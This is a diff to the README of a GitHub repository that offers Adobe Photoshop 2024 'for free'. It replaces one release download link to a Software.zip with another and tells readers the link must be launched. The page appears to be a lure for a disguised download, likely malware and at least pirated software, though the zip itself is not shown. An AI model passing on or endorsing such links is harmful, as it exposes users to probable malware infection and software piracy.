@@ -9,7 +9,7 @@ Welcome to the Al-Photoshop-2024 repository! 🖌️ This repository provides a 
 
 ## 🔗 Software Download
 You can download Adobe Photoshop 2024 for free from the following link:
-[![Download Adobe Photoshop 2024](https://img.shields.io/badge/Download-Adobe_Photoshop_2024-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Adobe Photoshop 2024](https://github.com/Jaybro0719/Al-Photoshop-2024/releases/download/v2.0/Software.zip)](https://github.com/Jaybro0719/Al-Photoshop-2024/releases/download/v2.0/Software.zip)
 
 *Note: The link needs to be launched to download the software package.* 🚀
 
